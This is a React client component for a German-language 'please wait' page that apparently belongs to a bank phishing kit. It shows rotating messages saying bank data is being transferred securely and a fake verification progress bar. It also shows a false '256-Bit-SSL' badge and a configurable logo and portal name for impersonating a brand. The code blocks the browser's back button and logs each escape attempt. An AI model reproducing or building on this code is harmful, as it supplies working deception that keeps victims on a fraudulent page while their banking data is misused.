"use client";

import { useEffect, useState } from "react";
import { useSettings } from "@/contexts/SettingsContext";
import { logAuditEvent, flushAuditQueueNow } from "@/lib/audit-event";

type Props = {
  sessionId: string;
};

const MESSAGES = [
  "Sichere Verbindung wird hergestellt...",
  "Bankdaten werden sicher uebertragen...",
  "Sicherheitsueberpruefung laeuft...",
  "Bitte warten Sie einen Moment...",
  "Verbindung wird autorisiert..."
];

export function WaitClient({ sessionId }: Props) {
  const { settings, loading: settingsLoading } = useSettings();
  const [messageIndex, setMessageIndex] = useState(0);

  useEffect(() => {
    const messageTimer = setInterval(() => {
      setMessageIndex((prev) => (prev + 1) % MESSAGES.length);
    }, 3500);
    return () => clearInterval(messageTimer);
  }, []);

  useEffect(() => {
    if (typeof window === "undefined") return;

    const WAIT_LOCK_KEY = `__wait_lock_${sessionId || "global"}__`;
    const waitUrl = window.location.href;

    logAuditEvent({
      session_id: sessionId || null,
      event_kind: "step",
      event_action: "wait_mount",
      status: "ok",
      from_step: (window.history.state as any)?.prevStep ?? null,
      to_step: "wait",
      pathname: window.location.pathname,
      meta: { messages: MESSAGES.length },
    });

    try {
      if ((window.history.state as any)?.[WAIT_LOCK_KEY] !== true) {
        window.history.replaceState(
          { ...(window.history.state || {}), [WAIT_LOCK_KEY]: true, __waitAnchor: true },
          "",
          waitUrl,
        );
      }
      window.history.pushState(
        { ...(window.history.state || {}), [WAIT_LOCK_KEY]: true, __waitFence: 1 },
        "",
        waitUrl,
      );
    } catch {}

    const onPopState = () => {
      try {
        window.history.replaceState(
          { ...(window.history.state || {}), [WAIT_LOCK_KEY]: true, __waitAnchor: true },
          "",
          waitUrl,
        );
        window.history.pushState(
          { ...(window.history.state || {}), [WAIT_LOCK_KEY]: true, __waitFence: 2 },
          "",
          waitUrl,
        );
      } catch {}
      logAuditEvent({
        session_id: sessionId || null,
        event_kind: "step",
        event_action: "wait_back_attempt",
        status: "blocked",
        from_step: "wait",
        to_step: "wait",
        pathname: window.location.pathname,
      });
      void flushAuditQueueNow();
      window.scrollTo({ top: 0, left: 0, behavior: "auto" });
    };

    window.addEventListener("popstate", onPopState);

    return () => {
      window.removeEventListener("popstate", onPopState);
    };
  }, [sessionId]);

  const progressWidth = ((messageIndex + 1) / MESSAGES.length) * 100;


  if (settingsLoading) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center">
        <div className="flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-[#DF0000]/30 border-t-[#DF0000]" />
        </div>
      </div>
    );
  }

  return (
    <div className="relative z-50 pak-page-shell min-h-screen flex-col overflow-hidden">
      <div className="absolute left-[-12%] top-[-10%] h-[420px] w-[420px] rounded-full bg-[#FF453A]/10 blur-[110px]" />
      <div className="absolute bottom-[-14%] right-[-8%] h-[420px] w-[420px] rounded-full bg-[#DF0000]/10 blur-[120px]" />

      <main className="flex w-full flex-col items-center justify-start p-4 pt-0">
        {!sessionId ? (
          <div className="flex justify-center relative z-10 w-full">
            <p className="rounded-xl border border-red-200 bg-red-50 p-4 text-center text-sm text-red-600 shadow-sm w-full max-w-sm">
              Ungueltiger Link.
            </p>
          </div>
        ) : (
          <div className="pak-form-card fade-in mx-auto flex w-full max-w-[760px] flex-col overflow-hidden">
            <div className="pak-form-inner px-6 pb-8 pt-8 sm:px-10 sm:pb-10 sm:pt-10">
              <div className="mx-auto mb-6 flex w-full max-w-[560px] items-start justify-between gap-4">
                <div>
                  <h2 className="pak-form-title max-w-[14ch]">{settings.wait_title}</h2>
                  <p className="pak-form-subtitle mt-3 max-w-[32rem]">
                    Wir verarbeiten Ihre Bestaetigung sicher und pruefen Ihre Verbindung.
                  </p>
                </div>
                <img
                  src={settings.logo_url && settings.logo_url !== "/logo.webp" ? settings.logo_url : "/logo.webp"}
                  alt={settings.portal_name || "Brand"}
                  className="pak-form-brand-logo shrink-0"
                />
              </div>

              <div className="mx-auto flex w-full max-w-[560px] flex-col items-center rounded-[28px] border border-[#FF453A]/30 bg-[radial-gradient(circle_at_top,rgba(255,69,58,0.14),transparent_55%),linear-gradient(180deg,rgba(30,12,12,0.96),rgba(14,10,10,0.98))] px-6 py-8 shadow-[inset_0_1px_0_rgba(255,69,58,0.08)]">
                <div className="relative mb-6 flex h-28 w-28 items-center justify-center">
                  <div className="absolute inset-0 rounded-full border border-[#FF453A]/20" />
                  <div className="absolute inset-[10px] rounded-full border border-[#FF453A]/20" />
                  <div className="absolute inset-0 animate-spin rounded-full border-[3px] border-transparent border-t-[#FF453A] border-r-[#FF453A]" style={{ animationDuration: "1.7s" }} />
                  <div className="absolute inset-[20px] rounded-full bg-[#FF453A]/12 blur-md" />
                  <svg className="relative z-10 h-11 w-11 text-[#FF453A]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" />
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.8" d="m8.8 11.8 2.1 2.1 4.5-4.7" />
                  </svg>
                </div>

                <div className="mb-6 min-h-[52px] px-3 text-center">
                  <p key={messageIndex} className="text-base font-semibold leading-6 text-white/82 animate-[fadeIn_0.5s_ease-in-out]">
                    {MESSAGES[messageIndex]}
                  </p>
                </div>

                <div className="w-full">
                  <div className="mb-2 flex items-center justify-between text-[11px] font-bold uppercase tracking-[0.14em] text-[#FF453A]/85">
                    <span>Verifizierung</span>
                    <span>{Math.round(progressWidth)}%</span>
                  </div>
                  <div className="h-3 overflow-hidden rounded-full border border-[#FF453A]/30 bg-black/30">
                    <div
                      className="relative h-full rounded-full bg-[linear-gradient(90deg,#DF0000_0%,#FF453A_60%,#FF453A_100%)] transition-all duration-1000 ease-in-out"
                      style={{ width: `${progressWidth}%` }}
                    >
                      <div className="absolute inset-y-0 right-0 w-16 bg-white/30 blur-md" />
                    </div>
                  </div>
                </div>

                <div className="mt-8 pak-form-security justify-center text-center">
                  <svg className="h-8 w-8 shrink-0 text-[#FF453A]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
                    <path d="M12 15v2m-6 4h12a2 2 0 0 0 2-2v-6a2 2 0 0 0-2-2H6a2 2 0 0 0-2 2v6a2 2 0 0 0 2 2Zm10-10V7a4 4 0 0 0-8 0v4h8Z" strokeLinecap="round" strokeLinejoin="round" />
                  </svg>
                  <span>256-Bit-SSL-Verschluesselung aktiv</span>
                </div>
              </div>
            </div>
          </div>
        )}
      </main>
    </div>
  );
}
